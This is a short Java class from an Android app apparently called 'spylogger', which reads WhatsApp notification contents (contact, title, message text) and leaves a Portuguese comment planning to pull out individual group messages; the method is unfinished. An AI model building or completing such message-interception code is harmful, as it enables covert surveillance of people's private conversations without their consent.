package com.gravatasufoca.spylogger.helpers;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.StatusBarNotification;

import com.gravatasufoca.spylogger.vos.ContatoVO;

/**
 * Created by bruno on 04/06/17.
 */

public class WhatsNotificationAdd extends MensagemNotificacao {

    public WhatsNotificationAdd(Context context,StatusBarNotification sbn) {
        super(context,sbn);
    }

    @Override
    protected void add() {
        Bundle extras = getSbn().getNotification().extras;
        ContatoVO contato=getContato(extras.get("android.people")!=null?((String[]) extras.get("android.people"))[0]:null);

        String title = extras.getString(Notification.EXTRA_TITLE);
        String text = extras.getCharSequence(Notification.EXTRA_TEXT).toString();
            /*
            quando tem o contato, quer dizer que foi a primeira notificacao do grupo.
            quando nao tem o contato, quer dizer que faz parte do grupo e eh a primeira mensagem. Neste caso eu devo percorrer o grupo e pegar a mensagem com a tag!=null (tag eh o key do whats)
            nesta notificacao o android.textLine traz todas as mensagens.
            Descobrir como o textLine eh, verificar se sera possivel extrair mensagem por mensagem
             */
    }

}
